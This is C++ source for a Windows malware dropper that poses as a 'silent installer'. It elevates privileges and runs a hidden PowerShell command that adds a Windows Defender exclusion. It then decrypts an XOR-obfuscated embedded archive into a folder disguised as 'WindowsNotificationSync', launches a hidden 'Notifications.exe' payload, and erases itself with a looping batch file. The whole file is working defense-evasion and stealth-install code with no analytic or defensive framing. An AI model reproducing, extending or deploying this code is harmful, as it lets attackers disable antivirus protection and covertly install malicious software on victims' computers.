#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <random>
#include <fstream>
#include <shellapi.h>
#include <tlhelp32.h>
#include <iostream>
#include <cstdio>
#include <shlobj.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

const char* ZIP_PASSWORD = "<zip_password>";
const int ZIP_RESOURCE_ID = 101;

void CreateConsole() {
    if (AllocConsole()) {
        freopen("CONOUT$", "w", stdout);
        freopen("CONOUT$", "w", stderr);
        freopen("CONIN$", "r", stdin);
        SetConsoleTitleA("Installer Debug Trace");
        printf("[*] Silent Installer Debug Mode Active.\n");
    }
}

bool LoadZipFromResource(std::vector<unsigned char>& outBuffer) {
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(ZIP_RESOURCE_ID), MAKEINTRESOURCEA(10));
    if (!hRes) return false;

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return false;

    DWORD size = SizeofResource(NULL, hRes);
    unsigned char* pData = (unsigned char*)LockResource(hData);

    if (pData && size > 0) {
        outBuffer.assign(pData, pData + size);
        return true;
    }
    return false;
}

void XORCrypt(unsigned char* data, size_t size, const char* key) {
    size_t keyLen = strlen(key);
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key[i % keyLen];
    }
}

bool IsElevated() {
    BOOL elevated = FALSE;
    HANDLE token = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            elevated = elevation.TokenIsElevated;
        }
        CloseHandle(token);
    }
    return elevated == TRUE;
}

bool RequestElevation() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas";
    sei.lpFile = exePath;
    sei.hwnd = NULL;
    sei.nShow = SW_HIDE;

    return ShellExecuteExW(&sei);
}

bool AddDefenderExclusion(const std::string& path) {
    std::string cmd = "powershell -Command \"Add-MpPreference -ExclusionPath '" + path + "'\"";
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;

    if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    return false;
}

#include <shlobj.h> 

std::string GenerateRandomPath() {
    char localPath[MAX_PATH];

    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localPath))) {
        std::string path = std::string(localPath) + "\\WindowsNotificationSync\\";
        return path;
    }

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    return std::string(tempPath) + "WindowsNotificationSync\\";
}

bool CreateDirectoryRecursive(const std::string& path) {
    size_t pos = 0;
    while ((pos = path.find_first_of("\\/", pos)) != std::string::npos) {
        std::string current = path.substr(0, pos++);
        if (current.length() > 0 && current.back() != ':') {
            CreateDirectoryA(current.c_str(), NULL);
        }
    }
    return CreateDirectoryA(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
}

bool ExtractZipWithPassword(const std::string& zipPath, const std::string& destPath) {
    std::string psCommand = "powershell -WindowStyle Hidden -Command \"$sh=New-Object -ComObject Shell.Application; "
        "$zip=$sh.NameSpace('" + zipPath + "'); $dest=$sh.NameSpace('" + destPath + "'); "
        "$dest.CopyHere($zip.Items(), 16)\"";

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;

    if (CreateProcessA(NULL, (LPSTR)psCommand.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 60000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    return false;
}

bool IsProcessRunning(const std::wstring& processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);

    bool found = false;
    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName.c_str()) == 0) {
                found = true;
                break;
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return found;
}

void SelfDelete() {
    char exePath[MAX_PATH];
    char batPath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    GetTempPathA(MAX_PATH, batPath);
    strcat(batPath, "silent_clean.bat");

    std::ofstream bat(batPath);
    if (bat.is_open()) {
        bat << "@echo off\n";
        bat << ":loop\n";
        bat << "del /F /Q \"" << exePath << "\" >nul 2>&1\n";
        bat << "if exist \"" << exePath << "\" goto loop\n";
        bat << "del /F /Q \"%~f0\" >nul 2>&1\n";
        bat.close();

        STARTUPINFOA si = { sizeof(si) };
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi;

        if (CreateProcessA(NULL, batPath, NULL, NULL, FALSE,
            CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {

    if (!IsElevated()) {
        if (RequestElevation()) return 0;
    }

    std::string installPath = GenerateRandomPath();
    CreateDirectoryRecursive(installPath);
    AddDefenderExclusion(installPath);

    std::vector<unsigned char> zipData;
    if (LoadZipFromResource(zipData)) {
        XORCrypt(zipData.data(), zipData.size(), ZIP_PASSWORD);

        std::string tempZip = installPath + "data.zip";
        std::ofstream ofs(tempZip, std::ios::binary);
        ofs.write((char*)zipData.data(), zipData.size());
        ofs.close();

        if (ExtractZipWithPassword(tempZip, installPath)) {
            DeleteFileA(tempZip.c_str());

            std::string target = installPath + "agent\\Notifications.exe";

            STARTUPINFOA si = { sizeof(si) };
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            PROCESS_INFORMATION pi;

            if (CreateProcessA(NULL, (LPSTR)target.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);

                Sleep(5000);

                if (IsProcessRunning(L"Notifications.exe")) {
                    SelfDelete();
                    return 0;
                }
            }
        }
    }

    SelfDelete();
    return 0;
}